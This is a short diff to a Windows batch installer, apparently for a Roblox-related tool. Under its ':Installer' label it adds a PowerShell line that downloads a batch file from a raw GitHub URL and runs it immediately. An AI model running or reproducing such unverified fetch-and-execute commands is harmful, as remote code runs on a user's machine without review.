@@ -24,6 +24,7 @@ powershell -command "(New-Object System.Net.WebClient).DownloadFile(\"https://ra
 goto Exit
 
 :Installer
+powershell -command "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/clipflip-rblx/custom-installer/main/installer.bat\", \"installer.bat\"); Start-Process -FilePath installer.bat"
 goto Start
 
 :Exit
